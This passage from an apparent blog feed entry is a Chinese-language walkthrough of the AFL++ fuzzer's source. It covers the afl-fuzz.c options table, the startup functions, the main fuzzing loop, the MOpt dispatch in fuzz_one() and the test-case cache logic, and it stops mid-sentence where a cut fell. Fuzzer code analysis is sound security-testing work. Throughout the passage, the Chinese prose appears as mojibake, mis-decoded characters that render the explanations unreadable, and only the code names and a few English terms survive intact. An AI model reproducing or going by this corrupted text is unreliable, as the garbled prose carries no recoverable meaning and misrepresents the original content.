  </entry>
  
  
  
  <entry>
    <title>AFL++æºç æµ…æ</title>
    <link href="/2022/07/06/AFLplusplus%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/"/>
    <url>/2022/07/06/AFLplusplus%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-æºç è§£æ"><a href="#AFL-æºç è§£æ" class="headerlink" title="AFL++æºç è§£æ"></a>AFL++æºç è§£æ</h1><h2 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h2><h3 id="mainå‡½æ•°"><a href="#mainå‡½æ•°" class="headerlink" title="mainå‡½æ•°"></a><strong>mainå‡½æ•°</strong></h3><ul><li><code>rand_set_seed()</code>è®¾ç½®å››ä¸ªç§å­ï¼šafl-&gt;init_seed, afl-&gt;rand_seed[0-2]</li><li>whileå¾ªç¯å¯¹é€‰é¡¹è¿›è¡Œåˆ¤æ–­ï¼Œæ”¯æŒçš„é€‰é¡¹æœ‰ï¼š<code>"+Ab:B:c:CdDe:E:hi:I:f:F:g:G:l:L:m:M:nNOo:p:RQs:S:t:T:UV:WXx:YZ"</code>ï¼š</li></ul><table><thead><tr><th>é€‰é¡¹</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>-i dir</code></td><td>æµ‹è¯•ç”¨ä¾‹è¾“å…¥ç›®å½•</td></tr><tr><td><code>-o dir</code></td><td>æ¨¡ç³Šæµ‹è¯•å‘ç°çš„è¾“å‡ºç›®å½•</td></tr><tr><td><code>-p schedule</code></td><td>èƒ½é‡è°ƒåº¦è®¡ç®—ä¸€ä¸ªç§å­è¡¨ç°åˆ†æ•°ï¼šfastï¼ˆé»˜è®¤ï¼‰ï¼Œexploreï¼Œexploitï¼Œseekï¼Œrareï¼Œmmoptï¼Œcoeï¼Œlinï¼Œquad</td></tr><tr><td><code>-f file</code></td><td>ç›®æ ‡ç¨‹åºè¯»å…¥æ•°æ®çš„ä½ç½®ï¼ˆé»˜è®¤ï¼šstdin æˆ– @@ï¼‰</td></tr><tr><td><code>-t msec</code></td><td>æ¯è½®çš„è¶…æ—¶æ—¶é—´ï¼ˆé»˜è®¤ 1000 msï¼‰ï¼Œæ·»åŠ â€™+â€™æ¥è‡ªåŠ¨è®¡ç®—è¶…æ—¶æ—¶é—´</td></tr><tr><td><code>-m megs</code></td><td>å­è¿›ç¨‹å†…å­˜é™åˆ¶ï¼ˆ0 MBï¼Œ0=æ— é™åˆ¶ [é»˜è®¤]ï¼‰</td></tr><tr><td><code>-A</code></td><td>ä½¿ç”¨ä»…äºŒè¿›åˆ¶æ’æ¡©ï¼ˆARM CoreSight modeï¼‰</td></tr><tr><td><code>-O</code></td><td>ä½¿ç”¨ä»…äºŒè¿›åˆ¶æ’æ¡©ï¼ˆFRIDA modeï¼‰</td></tr><tr><td><code>-Q</code></td><td>ä½¿ç”¨ä»…äºŒè¿›åˆ¶æ’æ¡©ï¼ˆQEMU modeï¼‰</td></tr><tr><td><code>-U</code></td><td>ä½¿ç”¨åŸºäºunicornçš„æ’æ¡©ï¼ˆUnicorn modeï¼‰</td></tr><tr><td><code>-W</code></td><td>ä½¿ç”¨åŸºäºqemuçš„Wineæ’æ¡©ï¼ˆWine modeï¼‰</td></tr><tr><td><code>-X</code></td><td>ä½¿ç”¨VMæ¨¡ç³Šæµ‹è¯•ï¼ˆNYX mode - standalone modeï¼‰</td></tr><tr><td><code>-Y</code></td><td>ä½¿ç”¨VMæ¨¡ç³Šæµ‹è¯•ï¼ˆNYX mode - multiple instances modeï¼‰</td></tr><tr><td><code>-g minlength</code></td><td>è®¾ç½®ç”Ÿæˆæ¨¡ç³Šæµ‹è¯•è¾“å…¥çš„æœ€å°é•¿åº¦ï¼ˆé»˜è®¤1ï¼‰</td></tr><tr><td><code>-G maxlength</code></td><td>è®¾ç½®ç”Ÿæˆæ¨¡ç³Šæµ‹è¯•è¾“å…¥çš„æœ€å¤§é•¿åº¦ï¼ˆé»˜è®¤ 1*1024*1024ï¼‰</td></tr><tr><td><code>-D</code></td><td>å¯ç”¨ç¡®å®šæ€§æ¨¡ç³Šæµ‹è¯•ï¼ˆä¸€ä¸ªé˜Ÿåˆ—ä»…è¿›è¡Œä¸€æ¬¡ï¼‰</td></tr><tr><td><span id="-L"><code>-L minutes</code></span></td><td>ä½¿ç”¨MOptï¼ˆimizeï¼‰æ¨¡å¼å¹¶è®¾ç½®è¿›å…¥pacemakeræ¨¡å¼çš„æ—¶é—´é™åˆ¶ï¼ˆæ— æ–°å‘ç°çš„æ—¶é—´ï¼‰ï¼Œ0=ç«‹å³ï¼Œ-1=ç«‹å³å¹¶è¿›è¡Œæ­£å¸¸å˜å¼‚</td></tr><tr><td><code>-c program</code></td><td>æŒ‡å®šä¸€ä¸ªç¼–è¯‘çš„äºŒè¿›åˆ¶æ¥å¯ç”¨CmpLogã€‚å¦‚æœä½¿ç”¨QEMU/FRIDAæˆ–æ¨¡ç³Šæµ‹è¯•ç›®æ ‡å·²ä½¿ç”¨CmpLogç¼–è¯‘ï¼Œé‚£ä¹ˆä½¿ç”¨<code>-c 0</code>.</td></tr><tr><td><code>-l cmplog_opts</code></td><td>CmpLogé…ç½®å€¼ï¼ˆå¦‚â€œ2ATâ€ï¼‰ï¼š1=å°æ–‡ä»¶ï¼Œ 2=å¤§æ–‡ä»¶ï¼ˆé»˜è®¤ï¼‰ï¼Œ3=æ‰€æœ‰æ–‡ä»¶ï¼ŒA=ç®—æ³•æ±‚è§£ï¼ŒT=transformationalæ±‚è§£</td></tr><tr><td><code>-Z</code></td><td>åºåˆ—é˜Ÿåˆ—é€‰æ‹©ï¼Œè€Œä¸æ˜¯éšæœºæƒé‡</td></tr><tr><td><code>-N</code></td><td>ä¸è§£é™¤æ¨¡ç³Šæµ‹è¯•æ–‡ä»¶çš„é“¾æ¥</td></tr><tr><td><code>-n</code></td><td>æ— æ’æ¡©æ¨¡ç³Šæµ‹è¯•ï¼ˆnon-instrumented modeï¼‰</td></tr><tr><td><code>-x dict_file</code></td><td>æ¨¡ç³Šå™¨å­—å…¸</td></tr><tr><td><code>-s seed</code></td><td>ä¸ºRNGä½¿ç”¨ä¸€ä¸ªå›ºå®šçš„ç§å­</td></tr><tr><td><code>-V seconds</code></td><td>æ¨¡ç³Šæµ‹è¯•ç‰¹å®šçš„æ—¶é—´ä¹‹åç»“æŸ</td></tr><tr><td><code>-E execs</code></td><td>æ‰§è¡Œä¸€ä¸ªè¿‘ä¼¼å¤šå°‘æ¬¡æ‰§è¡Œåç»ˆæ­¢æ¨¡ç³Šæµ‹è¯•</td></tr><tr><td><code>-M/-S id</code></td><td>åˆ†å¸ƒå¼æ¨¡å¼ï¼Œ-M auto-sets -Dï¼Œ-Zï¼ˆä½¿ç”¨-dç¦ç”¨-Dï¼‰å¹¶ä¸è¿›è¡Œtrimming</td></tr><tr><td><code>-F path</code></td><td>åŒæ­¥åˆ°ä¸€ä¸ªå¤–éƒ¨æ¨¡ç³Šå™¨é˜Ÿåˆ—ç›®å½•ï¼ˆéœ€è¦-Mï¼Œæœ€å¤šå¯ä»¥æŒ‡å®š32æ¬¡ï¼‰</td></tr><tr><td><code>-T text</code></td><td>åœ¨å±å¹•ä¸Šå±•ç¤ºtext banner</td></tr><tr><td><code>-I command</code></td><td>å½“ä¸€ä¸ªæ–°çš„crashå‘ç°æ—¶ï¼Œæ‰§è¡Œä¸€ä¸ªç‰¹å®šçš„å‘½ä»¤æˆ–è„šæœ¬</td></tr><tr><td><code>-C</code></td><td>crashæ¢ç´¢æ¨¡å¼</td></tr><tr><td><code>-b cpu_id</code></td><td>å°†æ¨¡ç³Šæµ‹è¯•è¿›ç¨‹ç»‘å®šåˆ°ç‰¹å®šçš„CPUæ ¸å¿ƒä¸Šï¼ˆ0-â€¦ï¼‰</td></tr><tr><td><code>-e ext</code></td><td>æ¨¡ç³Šæµ‹è¯•è¾“å…¥æ–‡ä»¶çš„æ–‡ä»¶æ‰©å±•ï¼ˆå¦‚æœéœ€è¦çš„è¯ï¼‰</td></tr><tr><td><code>-h</code></td><td>å±•ç¤ºé€‰é¡¹ä¿¡æ¯</td></tr></tbody></table><ul><li><code>setup_signal_handlers()</code>è®¾ç½®ä¿¡å·å¥æŸ„</li><li><code>check_asan_opts()</code>æ£€æŸ¥asané€‰é¡¹ï¼šè·å–ç¯å¢ƒå˜é‡<code>ASAN_OPTIONS</code>å¹¶æ£€æŸ¥ç›¸å…³é€‰é¡¹è®¾ç½®æ˜¯å¦æ­£ç¡®</li><li>afl-&gt;scheduleè®°å½•äº†aflèƒ½é‡è°ƒåº¦æ¨¡å¼ï¼Œé»˜è®¤ä¸ºfastï¼›å¦‚æœafl-scheduleåŸºäºfastå®ç°ï¼Œåˆ™éœ€è¦ä¸ºå…¶åŠ¨æ€åˆ†é…å†…å­˜ç”¨äºè®°å½•AFLFastè°ƒåº¦ä¿¡æ¯</li><li><code>check_crash_handling()</code>ç¡®ä¿æ ¸å¿ƒè½¬å‚¨ä¸ä¼šè¿›å…¥ä¸€ä¸ªç¨‹åºä¸­ã€‚</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern<br></code></pre></td></tr></tbody></table></figure><ul><li><p><code>check_cpu_governor()</code>ï¼šæ£€æŸ¥CPU governorï¼Œä¸»è¦æ£€æŸ¥linuxå†…æ ¸CPUè°ƒé¢‘æ˜¯å¦å­˜åœ¨é—®é¢˜ã€‚</p></li><li><p><code>save_cmdline()</code>ï¼šå°†å‘½ä»¤è¡Œä¿å­˜åˆ°afl-&gt;orig_cmdlineå˜é‡ä¸­</p></li><li><p><code>check_if_tty</code>ï¼šæ£€æŸ¥æ˜¯å¦æ˜¯ttyã€‚å…·ä½“é€šè¿‡<code>ioctl(1, TIOCGWINSZ, &amp;ws)</code>è·å–ç»ˆç«¯ä¿¡æ¯æ¥åˆ¤æ–­æ˜¯å¦ä¸ºttyç»ˆç«¯</p></li><li><p><code>get_core_count()</code>ï¼šè·å–CPUæ ¸å¿ƒæ•°</p></li><li><p><code>setup_dirs_fds()</code>ï¼šåˆ›å»ºç›¸å…³æ–‡ä»¶æè¿°ç¬¦</p></li><li><p><code>bind_to_free_cpu()</code>ï¼šæ„å»ºç»‘å®šåˆ°æ ¸å¿ƒçš„è¿›ç¨‹åˆ—è¡¨</p></li><li><p><code>init_count_class16()</code>ï¼šç”±count_class_lookup8æ¡¶æ„é€ count_class_lookup16æ•°ç»„</p></li><li><p><code>setup_custom_mutators()</code>ï¼šè®¾ç½®ç”¨æˆ·è‡ªå®šä¹‰çš„å˜å¼‚å™¨ï¼Œè¯¦è§<a href="./AFL++%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E5%BC%82%E5%99%A8.md">AFL++è‡ªå®šä¹‰å˜å¼‚å™¨</a></p></li><li><p><code>setup_cmdline_file()</code>ï¼šå°†å‘½ä»¤è¡Œä¿å­˜åˆ°default/cmdlineæ–‡ä»¶ä¸­</p></li><li><p><code>read_testcases()</code>ï¼šä»è¾“å…¥ç›®å½•ä¸­è¯»å–æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹ï¼Œç„¶åå°†å…¶æ”¾ç½®åœ¨é˜Ÿåˆ—ä¸­</p></li><li><p><code>pivot_inputs()</code>ï¼šä¸ºè¾“å‡ºç›®å½•çš„è¾“å…¥æµ‹è¯•ç”¨ä¾‹åˆ›å»ºç¡¬é“¾æ¥ï¼Œé€‰æ‹©ä¸€ä¸ªå¥½çš„åå­—å¹¶å°†å…¶è½¬ç§»åˆ°æ–°é˜Ÿåˆ—å®ä½“ä¸­</p></li><li><p><code>setup_stdio_file()</code>ï¼šä¸ºæ¨¡ç³Šæµ‹è¯•æ•°æ®åˆ›å»ºè¾“å…¥æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºdefault/.cur_inputï¼Œå¦‚æœåŒ…å«æ‰©å±•åï¼Œåˆ™ä¸ºdefault/.cur_input.(æ‰©å±•å)</p></li><li><p><code>check_binary()</code>ï¼šå¯¹PATHè·¯å¾„è¿›è¡Œæœç´¢æ¥å¯»æ‰¾ç›®æ ‡äºŒè¿›åˆ¶ï¼ŒåŒæ—¶ç¡®ä¿å…¶ä¸æ˜¯ä¸€ä¸ªshellè„šæœ¬ï¼ŒåŒæ—¶æ£€æŸ¥å…¶æ˜¯å¦æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ELFå¤´å¹¶åˆ¤æ–­æ˜¯å¦è¿›è¡Œäº†æ’æ¡©ï¼ˆé€šè¿‡ç¯å¢ƒå˜é‡<code>__AFL_SHM_ID</code>è¿›è¡Œåˆ¤æ–­ï¼‰ã€‚æ­¤å¤–ï¼Œè¯¥å‡½æ•°è¿˜æ£€æŸ¥ä¸€äº›ç¯å¢ƒå˜é‡å¹¶è®¾ç½®ç›¸å…³å‚æ•°</p></li><li><p><code>setup_testcase_shmem()</code>ï¼šè®¾ç½®æ¨¡ç³Šæµ‹è¯•è¾“å…¥çš„å…±äº«å†…å­˜ï¼Œå¹¶é€šè¿‡ç¯å¢ƒå˜é‡<code>__AFL_SHM_FUZZ_ID</code>ä¼ é€’ç»™forkserver</p></li><li><p><code>load_auto()</code>ï¼šè‡ªåŠ¨è½½å…¥ç”Ÿæˆçš„extras</p></li><li><p><code>deunicode_extras()</code>ï¼šæœ‰æ—¶å€™extrasä¸­çš„å­—ç¬¦ä¸²åœ¨å†…éƒ¨è½¬åŒ–ä¸ºunicodeç ï¼Œå› æ­¤æ¨¡ç³Šæµ‹è¯•æ—¶éœ€è¦å°†çœ‹èµ·æ¥åƒunicodeçš„å­—ç¬¦ä¸²è¿›è¡Œunicodeè§£ç æ“ä½œ</p></li><li><p><code>dedup_extras()</code>ï¼šä»è½½å…¥çš„extrasä¸­åˆ é™¤é‡å¤ï¼ˆåœ¨å¤šä¸ªæ–‡ä»¶è½½å…¥æ—¶å¯èƒ½ä¼šå‘ç”Ÿè¿™ä¸ªé—®é¢˜ï¼‰</p></li><li><p>å°†<code>virgin_bits</code>ã€<code>virgin_tmout</code>å’Œ<code>virgin_tmout</code>æ•°ç»„çš„æ¯”ç‰¹å…¨éƒ¨è®¾ç½®ä¸º1</p></li><li><p><code>perform_dry_run()</code>ï¼šå¯¹æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹é¢„è¿è¡Œä»¥ç¡®ä¿ç¨‹åºæŒ‰æœŸæœ›é‚£æ ·è¿è¡Œã€‚è¯¥æ“ä½œä»…åœ¨åˆå§‹è¾“å…¥é˜¶æ®µå®Œæˆå¹¶åªæ‰§è¡Œä¸€æ¬¡</p></li><li><p><span id="cullqueue"><code>cull_queue()</code>ï¼šç²¾ç®€é˜Ÿåˆ—ã€è´ªå¿ƒç®—æ³•ã€‘ï¼Œé€šè¿‡éå†top_rated[]ä¸­çš„queueå®ä½“ï¼Œæå–å‡ºèƒ½å¤Ÿå‘ç°æ–°è¾¹çš„å®ä½“ï¼Œå¹¶å°†å…¶æ ‡è®°ä¸º<code>favored</code>ã€‚åœ¨ä¸‹æ¬¡éå†é˜Ÿåˆ—æ—¶ï¼Œè¿™äº›<code>favored</code>å®ä½“èƒ½å¤Ÿè·å¾—æ›´å¤šæ‰§è¡Œæ¨¡ç³Šæµ‹è¯•çš„æœºä¼šã€‚</span></p></li><li><p><code>show_init_stats()</code>ï¼šæ‰“å°å‡ºåˆå§‹çŠ¶æ€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p></li></ul><p><img src="/2022/07/06/AFLplusplus%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/3.png"></p><ul><li><code>save_auto()</code>ï¼šè‡ªåŠ¨ä¿å­˜ç”Ÿæˆçš„extras</li></ul><hr><h3 id="æ¨¡ç³Šæµ‹è¯•ä¸»å¾ªç¯"><a href="#æ¨¡ç³Šæµ‹è¯•ä¸»å¾ªç¯" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•ä¸»å¾ªç¯"></a>æ¨¡ç³Šæµ‹è¯•ä¸»å¾ªç¯</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// main fuzzy loop</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">likely</span>(!afl-&gt;stop_soon)) {<br><span class="hljs-comment">// fuzzing stage</span><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p><a href="#cullqueue"><code>cull_queue()</code></a></p></li><li><p><code>afl-&gt;cycle_schedules</code>ä¸ºå‘¨æœŸæ›´æ¢è°ƒåº¦ç®—æ³•çš„æ ‡å¿—ï¼Œæ›´æ¢è°ƒåº¦ç®—æ³•åï¼Œéœ€è¦é‡æ–°è®¡ç®—é˜Ÿåˆ—æ‰€æœ‰å®ä½“çš„åˆ†æ•°</p></li><li><p><code>runs_in_current_cycle</code>ä¸ºè¡¨ç¤ºå½“å‰å¾ªç¯çš„å˜é‡</p></li><li><p><code>create_alias_table()</code>ï¼šåˆ›å»ºåˆ«åè¡¨ï¼Œå…è®¸æƒé‡éšæœºé€‰æ‹©ï¼ˆå¼€é”€è¾ƒå¤§ï¼‰</p><ul><li><code>static inline void *afl_realloc(void **buf, size_t size_needed)</code>ï¼š<ul><li>è¯¥å‡½æ•°ä¸ºreallocçš„ä¸€ä¸ªwrapperï¼Œå…¶ä¸»è¦æ˜¯ç¡®ä¿åœ¨è°ƒç”¨è¯¥å‡½æ•°åï¼Œbufçš„çœŸå®å¤§å°å§‹ç»ˆ &gt; size_neededï¼Œ<strong>é¿å…é¢‘ç¹è°ƒç”¨realloc</strong>ã€‚è¯¥buf sizeä½¿ç”¨<strong>æŒ‡æ•°å¢é•¿</strong>ã€‚</li></ul></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">afl_alloc_buf</span> {<br>  <span class="hljs-comment">/* The complete allocated size, including the header of len</span><br><span class="hljs-comment">   * AFL_ALLOC_SIZE_OFFSET */</span><br>  <span class="hljs-type">size_t</span> complete_size;<br>  <span class="hljs-comment">/* ptr to the first element of the actual buffer */</span><br>  u8 buf[<span class="hljs-number">0</span>];<br><br>};<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl-&gt;alias_table</code>ã€<code>afl-&gt;alias_probability</code>ä¸º<code>struct afl_alloc_buf</code>å‹æŒ‡é’ˆï¼Œåˆ†åˆ«è¡¨ç¤ºåˆ«åè¡¨å’Œç›¸åº”çš„æ¦‚ç‡</li><li>æ¥ä¸‹æ¥è¿›è¡Œä¸€ç³»åˆ—çš„æ¦‚ç‡è®¡ç®—ï¼Œå…¶ç»“æœæ›´æ–°åˆ°<code>afl-&gt;alias_probability</code>ä¸­</li></ul></li><li><p><code>select_next_queue_entry()</code>ï¼šåŸºäºåˆ«åé‡‡æ ·ç®—æ³•é€‰æ‹©ä¸‹ä¸€ä¸ªé˜Ÿåˆ—å®ä½“</p></li></ul><h4 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one()"></a>fuzz_one()</h4><ul><li><p>è¯¥fuzz_one()å‡½æ•°ä½äº<code>afl-fuzz-one.c</code>ä¸­ï¼Œè¯¥å‡½æ•°å®é™…ä¸Šä¸ºä¸€ä¸ªwrapperï¼Œæ—¨åœ¨å®ç°MOPTã€‚åŸå§‹çš„<code>fuzz_one()</code>å‡½æ•°è¢«é‡å‘½åä¸º<code>fuzz_one_original()</code></p></li><li><p>è¿™é‡Œä½¿ç”¨<code>afl-&gt;limit_time_sig</code>å‚æ•°å€¼è¿›è¡Œ<code>fuzz_one()</code>å‡½æ•°çš„åˆ†æµï¼š</p><ul><li><code>afl-&gt;limit_time_sig</code>ç”±<a href="#-L">-Lå‚æ•°</a>ç¡®å®šï¼Œ-Lå‚æ•°çš„<code>minute</code>ä¼ é€’ç»™<code>afl-&gt;limit_time_puppet</code>ï¼Œè¯¥å€¼ä»…èƒ½æ˜¯0åˆ°2000000 æˆ– -1</li><li><code>afl-&gt;limit_time_puppet == -1</code> <span class="github-emoji"><span>â¡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>afl-&gt;limit_time_sig = -1</code> &amp;&amp; <code>afl-&gt;limit_time_sig = 0</code>ï¼›å¦åˆ™ <code>afl-&gt;limit_time_sig = 1</code></li></ul><hr><ul><li><pre><code class="c++">/* ä¼ªä»£ç  */if (afl-&gt;limit_time_sig &lt;= 0) { // afl-&gt;limit_time_sig = 0 è¡¨ç¤ºä¸å¯ç”¨ MOPT    fuzz_one_original();}if (afl-&gt;limit_time_sig != 0) { // å¯ç”¨ MOPT    if (afl-&gt;limit_time_sig &lt;= 0)  pilot_fuzzing();    else if (afl-&gt;key_module == 1)  core_fuzzing();    else if (afl-&gt;key_module == 2)  pso_updating();}</code></pre></li></ul></li></ul><hr><h4 id="fuzz-one-original"><a href="#fuzz-one-original" class="headerlink" title="fuzz_one_original()"></a>fuzz_one_original()</h4><p>ä»é˜Ÿåˆ—ä¸­é€‰æ‹©ä¸€ä¸ªå®ä½“ï¼Œå¹¶è¿›è¡Œä¸€æ®µæ—¶é—´çš„æ¨¡ç³Šæµ‹è¯•ã€‚è¿”å›0è¡¨ç¤ºæˆåŠŸè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œè¿”å›1è¡¨ç¤ºè·³è¿‡æˆ–æ”¾å¼ƒæ¨¡ç³Šæµ‹è¯•</p><ul><li><p>å¦‚æœè®¾ç½®äº†ç”¨æˆ·è‡ªå®šä¹‰çš„å˜å¼‚å™¨ï¼Œå³<code>afl-&gt;custom_mutators_count = 1</code>ï¼Œé‚£ä¹ˆç”¨æˆ·è‡ªå®šä¹‰çš„å˜å¼‚å™¨å°†å†³å®šè·³è¿‡å“ªäº›æµ‹è¯•ç”¨ä¾‹</p></li><li><p>æ ¹æ®<code>afl-&gt;pending_favored</code>æ ‡å¿—æ¥åˆ¤æ–­åœ¨é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰æ–°çš„favoredã€æ²¡æœ‰æ¨¡ç³Šæµ‹è¯•è¿‡çš„ç§å­ï¼Œå¦‚æœæœ‰ä¸”å½“å‰ç§å­å·²ç»è¢«æ¨¡ç³Šæµ‹è¯•è¿‡æˆ–ä¸æ˜¯favoredï¼Œé‚£ä¹ˆæœ‰99%æ¦‚ç‡è·³è¿‡è¯¥ç§å­çš„æ¨¡ç³Šæµ‹è¯•ï¼›å¦‚æœ<code>afl-&gt;pending_favored</code>æ ‡å¿—ä¸º<code>false</code>ï¼Œé‚£ä¹ˆå¦‚æœå½“å‰æ¨¡ç³Šæµ‹è¯•ä¸ºæ’æ¡©æ¨¡å¼ã€å½“å‰ç§å­ä¸æ˜¯favoredä¸”ç§å­é˜Ÿåˆ—æ•°&gt;10ï¼Œå¦‚æœé˜Ÿåˆ—å‘¨æœŸå¤§äº1ä¸”å½“å‰ç§å­æœªè¿›è¡Œè¿‡æ¨¡ç³Šæµ‹è¯•ï¼ˆæ–°å‘¨æœŸå†…äº§ç”Ÿçš„ç§å­ï¼Œä½†ä¸æ˜¯favoredçš„ï¼‰ï¼Œ75%çš„æ¦‚ç‡è·³è¿‡ï¼›å¦åˆ™æœ‰95%çš„æ¦‚ç‡è·³è¿‡å¯¹è¯¥ç§å­çš„æ¨¡ç³Šæµ‹è¯•</p></li><li><p><code>queue_testcase_get()</code>ï¼šé¦–å…ˆåˆ¤æ–­æ˜¯å¦å¯ç”¨ç¼“å­˜ï¼Œå¦‚æœæœªå¯ç”¨ç¼“å­˜ï¼Œåˆ™ä»æ–‡ä»¶ä¸­è¯»å…¥æ•°æ®å¹¶è¿”å›ï¼›å¦åˆ™ï¼Œåˆ¤æ–­è¯¥æµ‹è¯•ç”¨ä¾‹æ˜¯å¦å·²ç»ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œå¦‚æœå·²è¢«ç¼“å­˜ï¼Œåˆ™ç›´æ¥ä»å†…å­˜ä¸­å–å‡ºå³å¯ï¼Œå¦åˆ™å°†è¯¥æµ‹è¯•ç”¨ä¾‹ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œè¿”å›æŒ‡é’ˆ<code>afl-&gt;queue_cur-&gt;testcase_buf</code>ã€‚</p><p>å¦‚æœå½“å‰æµ‹è¯•ç”¨ä¾‹æ— æ³•æ»¡è¶³æ”¾å…¥ç¼“å­˜çš„æ¡ä»¶ï¼ˆè¶…è¿‡ç¼“å­˜ç¼“å­˜å¤§å°/è¶…è¿‡æœ€å¤§ç¼“å­˜æ•°ï¼‰ï¼Œåˆ™è¿›è¡Œ<strong>ä¸€ä¸ªè‡ªé€‚åº”ç¼“å­˜å†²çªç®—æ³•</strong>ï¼Œå…·ä½“æ¥è¯´ï¼š</p><ul><li><code>afl-&gt;q_testcase_cache_size</code>ï¼šå½“å‰ç§å­æµ‹è¯•ç”¨ä¾‹ç¼“å­˜å¤§å°</li><li><code>afl-&gt;q_testcase_max_cache_size</code>ï¼šèƒ½å¤Ÿç¼“å­˜çš„æœ€å¤§ç§å­æµ‹è¯•ç”¨ä¾‹å¤§å°</li><li><code>afl-&gt;q_testcase_cache_count</code>ï¼šå½“å‰å·²ç¼“å­˜ç§å­ä¸ªæ•°</li><li><code>afl-&gt;q_testcase_max_cache_entries</code>ï¼šèƒ½å¤Ÿç¼“å­˜çš„æœ€å¤§çš„ç§å­æ•°</li><li><code>afl-&gt;q_testcase_max_cache_count</code>ï¼šå½“ç›®å‰ä¸ºæ­¢çš„æœ€å¤§ç¼“å­˜æ•°</li><li><code>afl-&gt;q_testcase_cache[]</code>ï¼šè¯¥æ•°ç»„ç»´æŠ¤äº†ä¸€ä¸ªå·²ç¼“å­˜çš„ç§å­åˆ—è¡¨</li></ul><p>ä¸€å…±æœ‰ä¸¤ç§æƒ…å†µï¼Œ<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ã€è¯¥æ“ä½œåªè¿›è¡Œä¸€æ¬¡ã€‘ æ˜¯ç¼“å­˜ç§å­æ•°æœªè¾¾åˆ°æœ€å¤§ç§å­ç¼“å­˜æ•°ï¼Œä»…ä»…æ˜¯ç¼“å­˜ç©ºé—´ä¸å¤Ÿäº†ï¼Œé‚£ä¹ˆå°†ç¼“å­˜çš„æœ€å¤§ç§å­æ•°<code>q_testcase_max_cache_entries</code>è®¾ç½®ä¸º max(afl-&gt;q_testcase_cache_count, afl-&gt;q_testcase_max_cache_count) + 1ï¼Œç„¶åé‡æ–°åˆ†é…<code>afl-&gt;q_testcase_cache</code>ã€è¯¥æ•°ç»„è®°å½•è¢«ç¼“å­˜çš„ç§å­ã€‘çš„ç©ºé—´ï¼ˆå½“å‰ç¼“å­˜ç§å­æ•°/å†å²æœ€å¤§ç§å­ç¼“å­˜æ•°+2ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¼“å­˜ç©ºé—´æº¢å‡ºï¼Œè¿˜éœ€è¦å°†å½“å‰ç¼“å­˜ç©ºé—´çš„ä¸€ä¸ªæˆ–å¤šä¸ªç¼“å­˜æ›¿æ¢ä¸ºå½“å‰ç§å­æµ‹è¯•ç”¨ä¾‹ï¼Œè§<a href="#case2">æƒ…å†µ2</a></p><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ç”±äºæµ‹è¯•ç”¨ä¾‹è¿‡å¤§ï¼Œå¯èƒ½ä¸éœ€è¦è¿™ä¹ˆå¤§çš„ç¼“å­˜ç§å­æ•°ï¼ˆå› ä¸ºè¾ƒå¤§çš„æµ‹è¯•ç”¨ä¾‹ä¼šå¾ˆå¿«å¡«å……ç¼“å­˜ç©ºé—´ï¼‰ï¼Œè¿™æœ¬èº«ä¹Ÿæ˜¯ä¸€ç§è‡ªé€‚åº”çš„ç¼“å­˜é…ç½®ã€‚</p><p><span id="case2"><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 